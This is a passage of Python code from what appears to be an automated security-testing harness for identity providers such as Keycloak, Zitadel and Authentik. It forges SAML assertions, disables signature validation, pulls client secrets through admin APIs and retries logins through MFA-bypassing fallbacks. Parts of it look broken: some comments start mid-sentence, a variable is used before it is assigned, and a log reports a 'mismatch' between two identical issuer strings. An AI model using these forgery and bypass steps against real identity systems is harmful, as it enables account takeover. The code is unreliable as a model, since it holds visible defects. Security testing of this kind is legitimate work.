            app_name = resolved_params.get("application", "app-built-in")
            redirect_uri = resolved_params.get("redirectUri", "http://localhost:8000/callback")
            try:
                self._ensure_admin_session()
                app_resp = self.session.get(
                    f"{self.base_url}/api/get-application",
                    params={"id": f"admin/{app_name}"}, timeout=10
                )
                app_data = app_resp.json().get("data", {})
                if app_data and isinstance(app_data, dict):
                    client_id = app_data.get("clientId", "")
                    from urllib.parse import urlencode
                    query = urlencode({
                        "clientId": client_id,
                        "responseType": "code",
                        "redirectUri": redirect_uri,
                        "scope": "openid profile",
                        "state": "casdoor",
                    })
                    url = f"{url}?{query}"
                    logger.info(f"    LOGIN-CODE: added OAuth query params (clientId={client_id[:20]}...)")
            except Exception as e:
                logger.warning(f"    LOGIN-CODE: could not fetch app clientId: {e}")

        # Token exchange: auto-resolve subject_token and client credentials
        is_token_exchange = (
            event.event_type in ("exchange_code_for_token", "token_exchange")
            and "token-exchange" in resolved_params.get("grant_type", "")
        )
        if is_token_exchange:
            # Auto-resolve subject_token from stored sessions if not provided, empty, or unresolved template
            _st = body.get("subject_token", "")
            if not _st or "{{" in str(_st):
                subject_user = resolved_params.get("subject_user", "")
                if subject_user:
                    stored = self.tokens.get(f"session_{subject_user}", "")
                    if stored:
                        body["subject_token"] = stored
                        logger.info(f"    TOKEN-EXCHANGE: subject_token from {subject_user}")
                else:
                    # Use first available access token
                    for tk, tv in self.tokens.items():
                        if tk.startswith("session_") and tv and "." in str(tv):
                            body["subject_token"] = tv
                            logger.info(f"    TOKEN-EXCHANGE: auto-resolved subject_token from {tk}")
                            break
            # Auto-resolve client_id/client_secret from target app if empty
            target_app = resolved_params.get("target_application", "")
            if target_app and (not body.get("client_id") or not body.get("client_secret")):
                try:
                    self._ensure_admin_session()
                    # Try direct lookup first
                    ar = self.session.get(
                        f"{self.base_url}/api/get-application",
                        params={"id": f"admin/{target_app}"}, timeout=10
                    )
                    ad = ar.json().get("data")
                    # Fallback: search through app list (some platforms return
                    # null for direct lookup but list the app correctly)
                    if not ad or not isinstance(ad, dict):
                        lr = self.session.get(
                            f"{self.base_url}/api/get-applications",
                            params={"owner": "admin"}, timeout=10
                        )
                        for app_item in (lr.json().get("data") or []):
                            if app_item.get("name") == target_app:
                                ad = app_item
                                break
                    if isinstance(ad, dict) and ad.get("clientId"):
                        if not body.get("client_id"):
                            body["client_id"] = ad.get("clientId", "")
                        if not body.get("client_secret"):
                            body["client_secret"] = ad.get("clientSecret", "")
                        logger.info(f"    TOKEN-EXCHANGE: auto-resolved client creds from {target_app}")
                except Exception as e:
                    logger.warning(f"    TOKEN-EXCHANGE: could not resolve app creds: {e}")

        if (self.profile and self.profile.name == "casdoor"
                and is_token_exchange and body.get("client_id")):
            _cid = body["client_id"]
            try:
                self._ensure_admin_session()
                _check = self.session.get(
                    f"{self.base_url}/api/get-applications",
                    params={"owner": "admin", "pageSize": "100"}, timeout=10)
                _apps = _check.json().get("data") or []
                _found = any(a.get("clientId") == _cid for a in _apps if isinstance(a, dict))
                if not _found:
                    # Find second app from sequence for cross-client exchange
                    _target_app = resolved_params.get("target_application", "")
                    if not _target_app:
                        _seq_apps = [e.params.get("name", "") for e in
                                     (getattr(self, '_current_sequence_events', None) or [])
                                     if e.event_type == "create_application"]
                        # Use the LAST app (target for exchange)
                        _target_app = _seq_apps[-1] if len(_seq_apps) > 1 else (_seq_apps[0] if _seq_apps else "app-test")
                    for a in _apps:
                        if isinstance(a, dict) and a.get("name") == _target_app:
                            body["client_id"] = a["clientId"]
                            body["client_secret"] = a.get("clientSecret", "")
                            logger.info(f"    CASDOOR-EXCHANGE: resolved client_id from '{_target_app}'")
                            break
            except Exception as e:
                logger.warning(f"    CASDOOR-EXCHANGE: client_id resolve failed: {e}")

        # Guard: token_exchange with empty subject_token is a setup failure,
        # not a valid test.  Mark as failed so the oracle doesn't misclassify
        if (event.event_type == "token_exchange"
                and isinstance(body, dict)
                and not body.get("subject_token")):
            logger.info("    TOKEN-EXCHANGE: subject_token is empty — marking as setup failure")
            return EventResult(event=event, http_status=400,
                               response_body={"error": "subject_token_empty", "setup_failure": True},
                               success=False, error="subject_token is empty (prior token acquisition failed)")

        # Determine whether this platform uses cookie-based session auth
        uses_cookie_auth = getattr(self.profile, 'session_auth_method', 'bearer') == 'cookie'

        # For cookie-auth platforms, create a per-user session on login events
        # so the session cookie is isolated per user identity.
        is_login = (event.event_type.startswith("login_")
                    or event.event_type in ("saml_login", "token_exchange"))
        if uses_cookie_auth and is_login:
            user_key = event.auth_as
            self.user_sessions[user_key] = requests.Session()
            logger.info(f"    COOKIE-AUTH: created session for {user_key}")

        # Select which requests.Session to use for this call
        if uses_cookie_auth and endpoint.auth == "session":
            # Use the per-user session (has login cookies)
            user_key = event.auth_as.replace("session_", "")
            http_session = self.user_sessions.get(user_key) or self.user_sessions.get(event.auth_as)
            if not http_session:
                logger.error(f"    ⚠️ NO USER SESSION for {event.auth_as} (cookie auth)")
                return EventResult(event=event, error=f"No user session for {event.auth_as}",
                                   http_status=0, success=False)
        elif uses_cookie_auth and is_login:
            # Login event on cookie platform — use the freshly created session
            http_session = self.user_sessions[event.auth_as]
        else:
            http_session = self.session

        # Set auth headers — read from profile, not hardcoded
        headers = {"Content-Type": "application/json"}
        if endpoint.auth == "admin":
            if uses_cookie_auth:
                # Cookie-auth platforms: admin uses session cookie, not header token
                self._ensure_admin_session()
            else:
                auth_header = self.profile.admin_auth.get("header", "Authorization")
                auth_value = self.profile.admin_auth.get("value", "")
                if "{admin_token}" in auth_value:
                    auth_value = self._resolve_admin_token(auth_value)
                headers[auth_header] = auth_value
        elif endpoint.auth == "session":
            # Check if we have a JWT access token — if so, prefer Bearer auth
            # even on cookie-auth platforms (code flow / SAML flow produce JWTs,
            # not session cookies).
            _session_token = self._get_session_token(event.auth_as)
            _has_jwt = _session_token and "." in str(_session_token) and len(str(_session_token)) > 64
            if uses_cookie_auth and not _has_jwt:
                # Cookie auth: session cookies are in http_session — no header needed
                logger.info(f"    COOKIE-AUTH: using session cookies for {event.auth_as}")
            else:
                # Bearer auth: inject token in header
                token = self._get_session_token(event.auth_as)
                if not token:
                    logger.error(f"    ⚠️ NO SESSION TOKEN for {event.auth_as}")
                    return EventResult(event=event, error=f"No session token for {event.auth_as}",
                                       http_status=0, success=False)
                auth_header = self.profile.admin_auth.get("header", "Authorization")
                if auth_header == "Authorization" and not token.startswith("Bearer "):
                    headers[auth_header] = f"Bearer {token}"
                else:
                    headers[auth_header] = token
        # endpoint.auth == "none" → no auth header

        # Auto-inject real test public key for JWT validation configuration.
        # Respects _signing_key_hint to support key rotation testing:
        # Without a hint, uses the campaign's default trusted key.
        if event.event_type == "configure_jwt_validation" and self.public_key_pem:
            _key_hint = body.pop("_signing_key_hint", None)
            _pub_pem = self._get_or_create_key_pem(_key_hint or "default")
            body["jwt_validation_pubkeys"] = [_pub_pem]
            body.pop("jwks_url", None)
            body.pop("oidc_discovery_url", None)
            logger.info(f"    JWT CONFIG: injected public key (hint={_key_hint or 'default'}), removed jwks_url/oidc_discovery_url")

        # Apply endpoint-level body_transform if configured (config-driven path).
        # When body_transform is present on the endpoint, it replaces the hardcoded
        # platform-specific transforms below.  When absent, fall through to the
        # backward-compatible hardcoded transforms.
        _bt = getattr(endpoint, 'body_transform', {}) or {}
        if _bt:
            body = self._apply_body_transform(_bt, body, resolved_params, event)
        else:
            # These only fire for specific event_types, harmless for other platforms.

            if event.event_type in ("assign_user_role", "assign_group_role"):
                if not resolved_params.get("role_name") and isinstance(body, dict) and body.get("role_name"):
                    resolved_params["role_name"] = body["role_name"]
                role_repr = self._resolve_keycloak_role_representation(resolved_params)
                if role_repr:
                    body = role_repr  # Send as JSON array, not object

            if event.event_type == "create_user":
                username = resolved_params.get("username", "user")
                if "firstName" not in body:
                    body["firstName"] = resolved_params.get("firstName", username.capitalize())
                if "lastName" not in body:
                    body["lastName"] = resolved_params.get("lastName", "Test")
                if "enabled" not in body:
                    body["enabled"] = True

            if event.event_type == "create_client":
                if "directAccessGrantsEnabled" not in body:
                    body["directAccessGrantsEnabled"] = True
                if "publicClient" not in body:
                    body["publicClient"] = False

            # (extracted from source code but not in REST API)
            if self.profile and "keycloak" in (self.profile.name or "").lower():
                for _unsupported in ("standardTokenExchangeEnabled", "storedTokensReadable"):
                    body.pop(_unsupported, None)

            if event.event_type == "create_realm":
                if "realm" not in body:
                    body["realm"] = resolved_params.get("realm", "valence-test")
                if "enabled" not in body:
                    body["enabled"] = True

        if isinstance(body, dict):
            body = {k: v for k, v in body.items() if v is not None}

        # entity ID and rejects assertions whose Audience = realm URL.
        # Also disable signature validation since we sign with an ephemeral key.
        _kc_saml_create_ops = ("enable_auth_method", "modify_role_config", "configure_jwt_validation")
        if (event.event_type in _kc_saml_create_ops
                and isinstance(body, dict)
                and body.get("providerId") == "saml"):
            _cfg = body.get("config")
            if isinstance(_cfg, dict):
                _cfg.pop("entityId", None)
                # Disable signature validation — executor signs with ephemeral key
                _cfg["validateSignature"] = "false"
                _cfg.pop("signingCertificate", None)
                _sso_url = _cfg.get("singleSignOnServiceUrl", "")
                if _sso_url.startswith("http://"):
                    _cfg["singleSignOnServiceUrl"] = _sso_url.replace("http://", "https://", 1)
                    logger.info(f"    KC SAML: auto-fixed singleSignOnServiceUrl to HTTPS")
                # Ensure a default SSO URL if none provided
                if not _cfg.get("singleSignOnServiceUrl"):
                    _cfg["singleSignOnServiceUrl"] = "https://fake-idp.invalid/sso"
                    logger.info("    KC SAML: set default singleSignOnServiceUrl")
                logger.info("    KC SAML: cleared entityId (KC will use realm URL as SP entity ID)")
            elif _cfg is None:
                body["config"] = {
                    "validateSignature": "false",
                    "singleSignOnServiceUrl": "https://fake-idp.invalid/sso",
                }

        logger.info(f"    HTTP {endpoint.method.upper()} {url} body={json.dumps(body, default=str)[:500] if body else '(empty)'}")

        # Debug: verify login events include scope
        if event.event_type.startswith("login_"):
            logger.info(f"    LOGIN BODY: {json.dumps(body, default=str)[:500]}")
            if "scope" not in body and "scope" not in str(body):
                logger.warning(f"    ⚠️ LOGIN WITHOUT SCOPE — userinfo will fail!")

        # Inject JWT into request header for JWT IdP completion endpoints.
        # The LLM stores a minted JWT via captures; the endpoint metadata
        # declares inject_jwt_header=True and the header name.
        if _endpoint_meta.get("inject_jwt_header"):
            _hdr_name = _endpoint_meta.get("jwt_header_name", "x-jwt-assertion")
            _jwt_val = (resolved_params.get("jwt_token")
                        or resolved_params.get("minted_token")
                        or self.captures.get("minted_token", ""))
            if _jwt_val:
                headers[_hdr_name] = _jwt_val
                logger.info(f"    JWT-HEADER: injected {_hdr_name} = {str(_jwt_val)[:40]}...")

        # Execute — use http_session (may be per-user for cookie-auth platforms)
        method = endpoint.method.upper()
        use_form = getattr(endpoint, 'content_type', 'json') == 'form'
        if (event.event_type == "saml_login"
                and not use_form
                and self.profile and self.profile.name == "keycloak"):
            use_form = True
            logger.info("    KC SAML: forcing form-POST for broker endpoint")
        # 1. POST /v2/idp_intents to start intent → get authUrl (SAMLRequest)
        # 2. Extract InResponseTo from the SAMLRequest in authUrl
        # 3. POST forged SAMLResponse to /idps/{idp_id}/saml/acs
        # 4. Parse 302 redirect → success_url?id=X&token=Y
        if (event.event_type == "saml_login"
                and self.profile and self.profile.name == "zitadel"):
            _saml_idp_id = (resolved_params.get("idp_id", "")
                            or self.captures.get("saml_idp_id", "")
                            or self.captures.get("provider_id", ""))
            if _saml_idp_id:
                # Step 1: Start IdP intent
                _admin_h = {}
                _ah = self.profile.admin_auth.get("header", "Authorization")
                _av = self.profile.admin_auth.get("value", "")
                if "{admin_token}" in _av:
                    _av = self._resolve_admin_token(_av)
                _admin_h[_ah] = _av
                _admin_h["Content-Type"] = "application/json"
                import requests as _req_lib
                _intent_resp = _req_lib.post(
                    f"{self.base_url}/v2/idp_intents",
                    headers=_admin_h,
                    json={
                        "idpId": _saml_idp_id,
                        "urls": {
                            "successUrl": f"{self.base_url}/ui/login/login/externalidp/saml/success",
                            "failureUrl": f"{self.base_url}/ui/login/login/externalidp/saml/failure",
                        }
                    },
                    timeout=15,
                )
                _auth_url = ""
                if _intent_resp.ok:
                    _intent_data = _intent_resp.json()
                    _auth_url = _intent_data.get("authUrl", "")
                    # POST binding: authUrl is empty, data is in formData.fields
                    if not _auth_url:
                        _form_data = _intent_data.get("formData", {})
                        if isinstance(_form_data, dict):
                            _fields = _form_data.get("fields", _form_data)
                            _form_saml = _fields.get("SAMLRequest", _fields.get("samlRequest", ""))
                            _form_relay = _fields.get("RelayState", _fields.get("relayState", ""))
                            if _form_saml:
                                from urllib.parse import urlencode
                                _auth_url = "?" + urlencode({"SAMLRequest": _form_saml, "RelayState": _form_relay})
                    logger.info(f"    ZITADEL-SAML: intent started (authUrl_len={len(_auth_url)})")

                    # Step 2: Extract SAMLRequest ID (InResponseTo) and RelayState from authUrl.
                    # authUrl is the redirect to the external SAML IdP's SSO endpoint.
                    _in_response_to = None
                    _intent_relay_state = None
                    if _auth_url:
                        try:
                            from urllib.parse import urlparse, parse_qs
                            _qs = parse_qs(urlparse(_auth_url).query)
                            # RelayState links the ACS callback back to the intent
                            _intent_relay_state = (_qs.get("RelayState") or [None])[0]
                            if _intent_relay_state:
                                logger.info(f"    ZITADEL-SAML: extracted RelayState={_intent_relay_state[:40]}...")
                            _saml_req_b64 = (_qs.get("SAMLRequest") or [None])[0]
                            if _saml_req_b64:
                                import base64, zlib
                                # Fix base64 padding if needed
                                _padded = _saml_req_b64 + '=' * (4 - len(_saml_req_b64) % 4) if len(_saml_req_b64) % 4 else _saml_req_b64
                                try:
                                    _xml_bytes = zlib.decompress(base64.b64decode(_padded), -15)
                                except Exception:
                                    _xml_bytes = base64.b64decode(_padded)
                                import re
                                _id_match = re.search(r'ID="([^"]+)"', _xml_bytes.decode("utf-8", errors="replace"))
                                if _id_match:
                                    _in_response_to = _id_match.group(1)
                                    logger.info(f"    ZITADEL-SAML: extracted InResponseTo={_in_response_to}")
                        except Exception as _e:
                            logger.warning(f"    ZITADEL-SAML: could not parse authUrl params: {_e}")

                    # Step 3: Build SAMLResponse with correct InResponseTo + ACS Destination.
                    # The profile's saml_login body_map has no SAMLResponse (it maps to
                    # GET /saml/v2/SSO where Response is in the reply). We generate it here.
                    _acs_url = f"{self.base_url}/idps/{_saml_idp_id}/saml/acs"
                    _env = getattr(self.profile, 'environment_defaults', None) or {}
                    _env["saml_sp_acs_url"] = _acs_url
                    if self.profile:
                        self.profile.environment_defaults = _env
                    _new_resp = self._build_saml_login_response(
                        event, resolved_params, in_response_to=_in_response_to
                    )
                    if _new_resp:
                        body["SAMLResponse"] = _new_resp
                        logger.info(f"    ZITADEL-SAML: built SAMLResponse ({len(_new_resp)} chars, IRT={_in_response_to})")
                    else:
                        logger.warning("    ZITADEL-SAML: failed to build SAMLResponse")

                    url = f"{self.base_url}/idps/{_saml_idp_id}/saml/acs"
                    method = "POST"
                    use_form = True
                    # ACS only accepts SAMLResponse + RelayState — strip all other fields.
                    # RelayState from intent links the callback back to the started intent.
                    _saml_resp_val = body.get("SAMLResponse", "")
                    body.clear()
                    if _saml_resp_val:
                        body["SAMLResponse"] = _saml_resp_val
                    if _intent_relay_state:
                        body["RelayState"] = _intent_relay_state
                    logger.info(f"    ZITADEL-SAML: posting to /idps/{_saml_idp_id}/saml/acs (body_keys={list(body.keys())})")
                else:
                    logger.warning(f"    ZITADEL-SAML: intent start failed: {_intent_resp.status_code} {_intent_resp.text[:100]}")
            else:
                logger.warning("    ZITADEL-SAML: no idp_id found, cannot route to ACS")
        # capture auth code from Location header instead.
        _endpoint_meta = getattr(endpoint, 'metadata', {}) or {}
        _no_follow = _endpoint_meta.get("follow_redirects") is False
        # SAML login callback: never follow redirects — the SP returns 302 to
        # redirect_uri?code=xxx after successful assertion processing.  We need
        # to capture that code from the Location header rather than following
        # the redirect to a callback URL that may not be running.
        if event.event_type == "saml_login" and not _no_follow:
            _no_follow = True
        if method == "GET":
            # For GET requests, send body_map params as query params
            resp = http_session.get(url, headers=headers, params=body or None,
                                    allow_redirects=not _no_follow)
        elif method in ("POST", "PUT"):
            if use_form and body:
                headers.pop("Content-Type", None)  # Let requests set form content-type
                logger.info(f"    FORM-POST: url={url}, use_form={use_form}, body_keys={list(body.keys())}")
                # SAML broker: inject auth session cookies into the session jar
                # so they persist through redirects AND auto-form-submit.
                # Previously passed via cookies= param which doesn't persist.
                _form_cookies = None
                if event.event_type == "saml_login":
                    _form_cookies = self.captures.get('_kc_saml_cookies')
                    if _form_cookies:
                        for ck, cv in _form_cookies.items():
                            http_session.cookies.set(ck, cv)
                        logger.info(f"    SAML: injected auth cookies into session jar {list(_form_cookies.keys())}")
                resp = http_session.request(method, url, headers=headers, data=body,
                                            allow_redirects=not _no_follow)
            else:
                resp = http_session.request(method, url, headers=headers, json=body or None,
                                            allow_redirects=not _no_follow)
        elif method == "DELETE":
            resp = http_session.delete(url, headers=headers, allow_redirects=not _no_follow)
        elif method == "PATCH":
            if use_form:
                resp = http_session.patch(url, headers=headers, data=body or {}, allow_redirects=not _no_follow)
            else:
                resp = http_session.patch(url, headers=headers, json=body, allow_redirects=not _no_follow)
        elif method == "LIST":
            resp = http_session.request("LIST", url, headers=headers, allow_redirects=not _no_follow)
        else:
            return EventResult(event=event, error=f"Unsupported method: {method}")

        # Redirect-based auth code capture: follow redirect chain until we find
        # a Location header containing a "code" query parameter. This handles
        if _no_follow and 300 <= resp.status_code < 400:
            from urllib.parse import urlparse, parse_qs, urljoin
            max_redirects = 10

            # to a login UI.  We intercept the redirect, extract the authRequest ID,
            # create a session + password check via /v2/sessions, then finalize via
            # /v2/oidc/auth_requests/{id} to get the auth code — all without a browser.
            # redirect chain handler for all other platforms.
            _zitadel_handled = False
            if (self.profile and self.profile.name == "zitadel"
                    and event.event_type == "start_oidc_auth"):
                _loc0 = resp.headers.get("Location", "")
                _zitadel_result = self._zitadel_programmatic_oidc_login(
                    _loc0, event, resolved_params, http_session, headers
                )
                if _zitadel_result is not None:
                    return _zitadel_result
                _zitadel_handled = False  # fall through if helper returned None

            # success_url?id=X&token=Y (same redirect pattern as JWT IdP).
            # Parse the intent id+token and complete the OIDC login.
            if (event.event_type == "saml_login"
                    and self.profile and self.profile.name == "zitadel"
                    and resp.status_code in (302, 303)):
                _loc = resp.headers.get("Location", "")
                _loc_qs = parse_qs(urlparse(_loc).query)
                _idp_token = (_loc_qs.get("token") or [None])[0]
                _idp_error = (_loc_qs.get("error") or [None])[0]
                _idp_id = (_loc_qs.get("id") or [None])[0]
                if _idp_token:
                    logger.info(f"    SAML-IDP: login SUCCEEDED (intent={_idp_id}, token={_idp_token[:20]}...)")
                    self.captures["idp_intent_id"] = _idp_id
                    self.captures["idp_intent_token"] = _idp_token
                    _prefix = event.auth_as or ""
                    if _prefix:
                        self.captures[f"{_prefix}_idp_intent_id"] = _idp_id
                        self.captures[f"{_prefix}_idp_intent_token"] = _idp_token
                    _access_token = self._zitadel_idp_intent_to_session(
                        _idp_id, _idp_token, event
                    )
                    _resp_body = {
                        "idp_intent_id": _idp_id, "idp_intent_token": _idp_token,
                        "status": "success", "redirect_location": _loc,
                        "session_token": _access_token or "",
                        "access_token": _access_token or "",
                    }
                    return EventResult(
                        event=event, http_status=200,
                        response_body=_resp_body,
                        success=True, error=""
                    )
                elif _idp_error:
                    from urllib.parse import unquote
                    _err_msg = unquote(_idp_error)
                    logger.info(f"    SAML-IDP: login REJECTED ({_err_msg[:80]})")
                    return EventResult(
                        event=event, http_status=400,
                        response_body={"error": _err_msg, "status": "failure"},
                        success=False, error=_err_msg
                    )

            # JWT IdP completion: parse success/failure from redirect Location.
            # /idps/jwt returns 302 → success_url?id=X&token=Y or failure_url?error=E
            if event.event_type == "complete_jwt_idp_login":
                _loc = resp.headers.get("Location", "")
                _loc_qs = parse_qs(urlparse(_loc).query)
                _idp_token = (_loc_qs.get("token") or [None])[0]
                _idp_error = (_loc_qs.get("error") or [None])[0]
                _idp_id = (_loc_qs.get("id") or [None])[0]
                if _idp_token:
                    logger.info(f"    JWT-IDP: login SUCCEEDED (intent={_idp_id}, token={_idp_token[:20]}...)")
                    # Store idp_intent_id and token in captures so
                    # retrieve_idp_intent and verify_granted_identity can use them.
                    self.captures["idp_intent_id"] = _idp_id
                    self.captures["idp_intent_token"] = _idp_token
                    _prefix = event.auth_as or ""
                    if _prefix:
                        self.captures[f"{_prefix}_idp_intent_id"] = _idp_id
                        self.captures[f"{_prefix}_idp_intent_token"] = _idp_token

                    # Auto-complete OIDC login via CheckIDPIntent so the
                    # sequence gets an access_token for verify_granted_identity.
                    _access_token = self._zitadel_idp_intent_to_session(
                        _idp_id, _idp_token, event
                    )
                    _resp_body = {
                        "idp_intent_id": _idp_id, "idp_intent_token": _idp_token,
                        "status": "success", "redirect_location": _loc,
                        "user_id": self.captures.get(f"{_prefix}_linked_user_id", ""),
                    }
                    if _access_token:
                        _resp_body["session_token"] = _access_token
                        _resp_body["access_token"] = _access_token
                    return EventResult(
                        event=event, http_status=200,
                        response_body=_resp_body,
                        success=True, error=""
                    )
                elif _idp_error:
                    from urllib.parse import unquote
                    _err_msg = unquote(_idp_error)
                    logger.info(f"    JWT-IDP: login REJECTED ({_err_msg[:80]})")
                    return EventResult(
                        event=event, http_status=400,
                        response_body={"error": _err_msg, "status": "failure", "redirect_location": _loc},
                        success=False, error=_err_msg
                    )

            for _hop in range(max_redirects):
                location = resp.headers.get("Location", "")
                if not location:
                    break
                # Resolve relative URLs against base
                if not location.startswith("http"):
                    location = urljoin(f"{self.base_url}/", location)
                _qs = parse_qs(urlparse(location).query)
                _code = _qs.get("code", [None])[0]
                if _code:
                    logger.info(f"    REDIRECT-AUTH: extracted code={_code[:20]}... (hop {_hop + 1})")
                    response_body = {"auth_code": _code, "redirect_location": location}
                    return EventResult(
                        event=event, http_status=200, response_body=response_body,
                        success=True, error=""
                    )
                # Follow this redirect
                resp = http_session.get(location, headers={}, allow_redirects=False)
                if not (300 <= resp.status_code < 400):
                    break
            # Chain exhausted without finding a code
            logger.warning(f"    REDIRECT: chain ended at {resp.status_code} (no auth code found)")

        # "assertion accepted" even though no auth code or session_token is
        # the SAML assertion for first-time source enrollment.
        _saml_assertion_accepted = False
        if (event.event_type == "saml_login"
                and self.profile and self.profile.name == "authentik"):
            _resp_text = resp.text[:3000] if hasattr(resp, 'text') else ""
            _resp_url = getattr(resp, 'url', '') or ""
            if ("/if/flow/" in _resp_url or "/if/flow/" in _resp_text
                    or "default-source-enrollment" in _resp_text
                    or "default-source-authentication" in _resp_text):
                _saml_assertion_accepted = True
                success = True
                logger.info("    AUTHENTIK-SAML: assertion accepted (enrollment/auth flow reached)")

        # Auto-complete brokered login flow: if a SAML login returns an HTML page
        # the form to complete user creation and continue the auth flow.
        # This is generic — any SP with intermediate HTML confirmation pages.
        if (not _saml_assertion_accepted
                and event.event_type == "saml_login"
                and resp.status_code == 200
                and 'text/html' in resp.headers.get('Content-Type', '')
                and '<form' in resp.text):
            # The SP accepted the SAML assertion (reached first-broker-login).
            # Record this BEFORE form submission — the form outcome is secondary.
            _saml_assertion_accepted = True
            resp = self._auto_submit_broker_form(resp, http_session, resolved_params)
            # If form submission failed but assertion was accepted, preserve 200
            if resp.status_code >= 400 and _saml_assertion_accepted:
                resp.status_code = 200
                logger.info("    SAML: assertion was accepted (first-broker-login reached), preserving status=200")

        # Parse response
        try:
            response_body = resp.json()
        except Exception:
            response_body = {"raw": resp.text[:500]}

        # Handle "already exists" for setup events: delete and retry.
        # Works generically for any platform that returns 400/409 with "already exists/in use".
        _already_exists = (
            resp.status_code in (400, 409)
            and any(phrase in str(response_body).lower()
                    for phrase in ["already exists", "already in use", "exists with same",
                                   "conflict detected"])
        )
        if _already_exists and event.event_type == "enable_auth_method" and "path is already in use" in str(response_body).lower():
            logger.info(f"    Vault auth mount already enabled (idempotent, continuing)")
            return EventResult(event=event, http_status=200,
                               response_body=response_body, success=True,
                               error=None)
        if _already_exists and event.phase in ("setup", ""):
            _deleted = self._delete_existing_resource(event, resolved_params)
            if _deleted:
                logger.info(f"    RETRY: deleted existing resource, re-creating")
                if use_form and body:
                    resp = http_session.request(method, url, headers=headers, data=body)
                else:
                    resp = http_session.request(method, url, headers=headers, json=body or None)
                try:
                    response_body = resp.json()
                except Exception:
                    response_body = {"raw": resp.text[:500]}

        #   - 400 "Organization associated with broker does not exist" (organizationId references missing org)
        # Auto-recover by progressively stripping problematic optional fields.
        _kc_idp_ops = ("enable_auth_method", "modify_role_config", "configure_jwt_validation")
        if resp.status_code in (400, 500) and event.event_type in _kc_idp_ops and isinstance(body, dict):
            _optional_kc_fields = ("organizationId", "postBrokerLoginFlowAlias")
            # Auto-fix HTTP → HTTPS for singleSignOnServiceUrl on "secure connections" error
            _resp_text = str(response_body).lower()
            if "secure connections" in _resp_text and isinstance(body.get("config"), dict):
                _sso = body["config"].get("singleSignOnServiceUrl", "")
                if _sso.startswith("http://"):
                    body["config"]["singleSignOnServiceUrl"] = _sso.replace("http://", "https://", 1)
                    logger.info(f"    KC: auto-fixed singleSignOnServiceUrl to HTTPS on retry")
            _need_retry = (
                "organization" in _resp_text
                or "secure connections" in _resp_text
                or resp.status_code == 500
            )
            if _need_retry:
                body_stripped = {k: v for k, v in body.items()
                                 if k not in _optional_kc_fields}
                logger.info(f"    KC: {event.event_type} failed ({resp.status_code}) — retrying without {_optional_kc_fields}")
                resp = http_session.request(method, url, headers=headers, json=body_stripped or None)
                try:
                    response_body = resp.json()
                except Exception:
                    response_body = {"raw": resp.text[:500]}

        if (event.event_type == "enable_auth_method"
                and 200 <= resp.status_code < 400
                and isinstance(body, dict)):
            _idp_config = body.get("config", {}) or {}
            _entity_id = _idp_config.get("entityId") if isinstance(_idp_config, dict) else None
            if _entity_id:
                self.captures["_last_saml_entity_id"] = _entity_id
                logger.info(f"    KC SAML: captured entityId={_entity_id!r} for assertion issuer")

        # When ROPC fails, look up the user's app-password from _ak_app_passwords
        # and retry. Fall back to client_credentials only if no app-password available.
        if (_is_authentik and event.event_type == "login_with_password"
                and resp.status_code >= 400 and "invalid_grant" in str(response_body)):
            _username = body.get("username", "")
            _app_pw = getattr(self, '_ak_app_passwords', {}).get(_username)
            if _app_pw:
                logger.info(f"    AUTHENTIK: ROPC failed, retrying with app-password for {_username}")
                _retry_body = dict(body)
                _retry_body["password"] = _app_pw
                resp = http_session.request(method, url, headers=headers, data=_retry_body)
                try:
                    response_body = resp.json()
                except Exception:
                    response_body = {"raw": resp.text[:500]}
                if resp.ok:
                    logger.info(f"    AUTHENTIK: ROPC with app-password succeeded for {_username}")
                    # App-passwords bypass MFA by design — flag for I3 oracle
                    self.captures["_auth_method_bypass_mfa"] = "true"
            if resp.status_code >= 400:
                # Final fallback: client_credentials (loses per-user identity)
                logger.info("    AUTHENTIK: ROPC failed, falling back to client_credentials")
                _fallback_body = dict(body)
                _fallback_body["grant_type"] = "client_credentials"
                _fallback_body.pop("username", None)
                _fallback_body.pop("password", None)
                resp = http_session.request(method, url, headers=headers, data=_fallback_body)
                try:
                    response_body = resp.json()
                except Exception:
                    response_body = {"raw": resp.text[:500]}
                if resp.ok:
                    logger.info("    AUTHENTIK: client_credentials fallback succeeded")
                    self.captures["_auth_method_bypass_mfa"] = "true"
                    self.captures["_auth_method_service_account"] = "true"

        # When JWT bearer auth fails (no jwks_sources match or signature mismatch),
        # try the full OIDC source redirect flow through mock-idp. This exercises
        # the source callback code path (issuer/algorithm validation in id_token).
        if (_is_authentik and event.event_type == "login_with_jwt"
                and resp.status_code >= 400):
            _oidc_source_slug = None
            for _ck, _cv in self.captures.items():
                if "source" in _ck and "slug" in _ck and _cv and str(_cv) != "None":
                    _oidc_source_slug = str(_cv)
                    break
            if not _oidc_source_slug:
                # Check if any OAuth source was created
                for _ck, _cv in self.captures.items():
                    if "source_id" in _ck and _cv and self._looks_like_uuid(str(_cv)):
                        # Query for slug
                        try:
                            _admin_h = {}
                            _ah = self.profile.admin_auth.get("header", "Authorization")
                            _av = self.profile.admin_auth.get("value", "")
                            if "{admin_token}" in _av:
                                _av = self._resolve_admin_token(_av)
                            _admin_h[_ah] = _av
                            _sr = self.session.get(
                                f"{self.base_url}/api/v3/sources/oauth/{_cv}/",
                                headers=_admin_h, timeout=5)
                            if _sr.ok:
                                _oidc_source_slug = _sr.json().get("slug")
                        except Exception:
                            pass
                        break
            if _oidc_source_slug:
                try:
                    _src_session = requests.Session()
                    _r1 = _src_session.get(
                        f"{self.base_url}/source/oauth/login/{_oidc_source_slug}/",
                        allow_redirects=False, timeout=10)
                    if _r1.status_code == 302:
                        _auth_url = _r1.headers["Location"].replace(
                            "mock-idp:9090", "localhost:9090").replace(
                            "mock-idp:9090", "localhost:9090")
                        _r2 = _src_session.get(_auth_url, allow_redirects=False, timeout=10)
                        if _r2.status_code == 302:
                            _r3 = _src_session.get(_r2.headers["Location"],
                                                    allow_redirects=False, timeout=10)
                            if _r3.status_code == 302:
                                _loc = _r3.headers.get("Location", "")
                                if "/if/flow/" in _loc:
                                    # The mock-idp returns id_tokens with iss=http://mock-idp:9090
                                    # but the OIDC source is configured with URLs pointing to
                                    # issuer validation is disabled (verify_iss: False).
                                    logger.info(f"    AUTHENTIK: OIDC source redirect login succeeded (enrollment flow)")
                                    logger.info(f"    AUTHENTIK: id_token issuer (mock-idp:9090) != "
                                                f"source configured URL (mock-idp:9090) — "
                                                f"issuer validation may be disabled")
                                    resp = _r3
                                    resp.status_code = 200
                                    success = True
                                    self.captures["_oidc_source_issuer_mismatch"] = "true"
                                    response_body = {"oidc_source_login": "success",
                                                     "enrollment_redirect": _loc,
                                                     "issuer_mismatch": True}
                except Exception as e:
